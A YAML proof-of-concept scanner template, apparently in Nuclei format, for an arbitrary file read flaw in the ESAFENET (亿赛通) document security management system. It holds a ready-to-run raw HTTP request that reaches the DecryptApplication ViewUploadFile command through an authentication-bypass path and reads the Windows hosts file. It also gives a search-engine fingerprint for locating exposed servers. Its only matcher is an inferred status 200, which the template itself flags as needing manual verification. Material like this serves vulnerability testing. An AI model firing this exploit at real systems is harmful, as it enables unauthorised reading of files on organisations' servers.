id: poc-628316cfba2a45bcc16a
info:
  name: 亿赛通电子文档安全管理系统ViewUploadFile存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/628316cfba2a45bcc16aeb1b5a5634a9

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,lfi,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 628316cfba2a45bcc16aeb1b5a5634a9
    fofa: + hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
http:
- raw:
  - 'GET /CDGServer3/client/;login;/DecryptApplication?command=ViewUploadFile&filePath=C:/Windows/System32/drivers/etc/hosts&uploadFileId=1&fileName1=hosts HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Accept-Language: zh-CN,zh;q=0.9

    Cookie: JSESSIONID=5BEE0014C9CD691F3177A3194EB06C3F

    Upgrade-Insecure-Requests: 1

    Accept-Encoding: gzip, deflate'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
